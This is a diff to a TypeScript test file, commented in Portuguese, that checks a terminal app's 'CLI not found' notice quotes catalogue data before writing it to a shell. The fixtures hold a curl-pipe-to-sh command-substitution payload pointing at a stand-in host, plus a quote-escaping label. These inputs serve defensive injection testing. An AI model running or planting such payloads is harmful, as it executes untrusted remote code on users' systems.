@@ -40,14 +40,16 @@ vi.mock('../../terminal/terminal-host', () => ({
   writeToPane: (paneId: string, text: string) => host.writeToPane(paneId, text),
 }));
 
+/** Catálogo de providers: mutável para o teste da mensagem de CLI ausente. */
+const providerState = vi.hoisted(() => ({
+  providers: [] as Array<Record<string, unknown>>,
+}));
+
 vi.mock('../../state/provider-store', () => ({
   useProviderStore: Object.assign(
-    () => ({ providers: [], hydrate: async () => undefined }),
+    () => providerState,
     {
-      getState: () => ({
-        providers: [],
-        hydrate: async () => undefined,
-      }),
+      getState: () => providerState,
       subscribe: () => () => undefined,
     },
   ),
@@ -83,6 +85,7 @@ describe('openCliLoginTerminal', () => {
     host.waitForSession.mockClear().mockResolvedValue('session-login');
     host.writeToPane.mockClear();
     panes.open = [{ id: 'pane-login' }];
+    providerState.providers = [];
   });
 
   it('espera a sessão e só então sai de Configurações (F-003)', async () => {
@@ -251,6 +254,7 @@ describe('openCliLoginTerminal — o que o watcher entrega ao fechar', () => {
     Reflect.deleteProperty(window, 'nexus');
   });
 
+
   it('fechar o terminal sem trocar de sessão NÃO é login novo', async () => {
     stubProbe({ ...baseline });
     const finished: CliLoginFinish[] = [];
@@ -289,5 +293,55 @@ describe('openCliLoginTerminal — o que o watcher entrega ao fechar', () => {
     });
     await vi.waitFor(() => expect(finished).toHaveLength(1));
     expect(finished[0]!.verified).toBe(false);
+  });
+});
+
+/**
+ * O aviso de "CLI não encontrada" é TEXTO, não instrução: ele só pode aparecer
+ * na tela. `provider.label` e `installCommand` são dados do catálogo, e o que
+ * chega ao pane é um shell de verdade — então nada que venha dali pode ser
+ * interpretado.
+ */
+describe('openCliLoginTerminal — o aviso de CLI ausente não executa o próprio texto', () => {
+  /** O que o shell realmente veria: só o que está FORA de aspas simples. */
+  function outsideSingleQuotes(text: string): string {
+    return text.replace(/'[^']*'/g, '');
+  }
+
+  it('comando sugerido com substituição de shell sai citado, não executável', async () => {
+    providerState.providers = [
+      {
+        adapterId: 'evil',
+        label: 'Evil',
+        installed: false,
+        installCommand: 'npm i -g evil $(curl -s https://x.test/p | sh) `id`',
+      },
+    ];
+
+    await openCliLoginTerminal({ command: 'evil login', adapterId: 'evil' });
+
+    const written = host.writeToPane.mock.calls[0]?.[1] as string;
+    expect(written).toBeDefined();
+    // Fora das aspas não sobra `$` nem crase: nenhuma substituição roda.
+    expect(outsideSingleQuotes(written)).not.toMatch(/[$`]/);
+    // E o texto continua legível para quem lê, só que inerte: as aspas que o
+    // cercam são o que a asserção acima já provou.
+    expect(written).toContain('npm i -g evil $(curl -s https://x.test/p | sh) `id`');
+  });
+
+  it('aspas simples no rótulo não escapam do literal', async () => {
+    providerState.providers = [
+      {
+        adapterId: 'quoted',
+        label: "It's $(id)",
+        installed: false,
+        installCommand: 'echo ok',
+      },
+    ];
+
+    await openCliLoginTerminal({ command: 'quoted login', adapterId: 'quoted' });
+
+    const written = host.writeToPane.mock.calls[0]?.[1] as string;
+    expect(outsideSingleQuotes(written)).not.toMatch(/[$`]/);
   });
 });
